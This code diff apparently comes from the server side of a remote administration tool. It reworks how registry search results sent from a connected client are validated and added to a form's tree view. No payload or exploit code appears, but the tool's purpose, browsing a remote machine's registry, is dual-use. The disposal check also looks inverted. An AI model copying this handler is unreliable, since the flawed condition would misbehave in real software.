@@ -16,23 +16,35 @@ namespace xServer.Core.Commands
             try
             {
                 // Make sure that we can use the packet.
-                if (packet.Matches != null && packet.Matches.Length > 0)
+                if ((packet.Key != null) && (packet.Value != null) && (packet.Data != null))
                 {
                     // Make sure that the client is in the correct state to handle the packet appropriately.
                     if (client != null && client.Value.FrmRe != null && client.Value.FrmRe.IsDisposed || client.Value.FrmRe.Disposing)
                     {
-                        if (packet.IsRootKey)
+                        // Make sure that all of the arrays are of a valid length.
+                        if ((packet.Key.Length > 0) && (packet.Key.Length == packet.Value.Length) && (packet.Key.Length == packet.Data.Length))
                         {
-                            foreach (Utilities.RegSeekerMatch match in packet.Matches)
+                            Utilities.RegSeekerMatch[] Matches = new Utilities.RegSeekerMatch[packet.Key.Length];
+
+                            // Build the matches into a single array.
+                            for (int i = 0; i < packet.Key.Length; i++)
                             {
-                                client.Value.FrmRe.AddRootKey(match);
+                                Matches[i] = new Utilities.RegSeekerMatch(packet.Key[i], packet.Value[i], packet.Data[i]);
                             }
-                        }
-                        else
-                        {
-                            // Add the key to the TreeView.
-                            // ToDo: Add the regular keys (matches) to the TreeView.
-                            // ToDo: Maintain order when adding to the TreeView.
+
+                            if (packet.IsRootKey)
+                            {
+                                foreach (Utilities.RegSeekerMatch match in Matches)
+                                {
+                                    client.Value.FrmRe.AddRootKey(match);
+                                }
+                            }
+                            else
+                            {
+                                // Add the key to the TreeView.
+                                // ToDo: Add the regular keys (matches) to the TreeView.
+                                // ToDo: Maintain order when adding to the TreeView.
+                            }
                         }
                     }
                 }
